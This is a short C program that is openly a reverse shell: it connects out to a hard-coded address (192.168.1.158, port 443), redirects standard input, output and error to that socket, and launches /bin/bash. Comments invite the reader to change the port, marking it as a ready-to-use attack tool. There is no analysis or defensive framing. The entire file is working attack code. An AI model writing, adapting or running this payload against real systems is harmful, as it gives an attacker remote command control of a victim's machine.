#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char* argv) {
    int socket_no;
    //change the port number here
    int port = 443;
    struct sockaddr_in reverse_sock;

    socket_no = socket(AF_INET, SOCK_STREAM, 0);

    reverse_sock.sin_family = AF_INET;
    reverse_sock.sin_port = htons(port);
    reverse_sock.sin_addr.s_addr = inet_addr("192.168.1.158");

    connect(socket_no, (struct sockaddr *)&reverse_sock, sizeof(reverse_sock));
    //Since it's a reverse TCP
    dup2(socket_no, 0);
    dup2(socket_no, 1);
    dup2(socket_no, 2);

    char * const argvq[] = {"/bin/bash", NULL};
    execv("/bin/bash", argvq);

    return 0;
}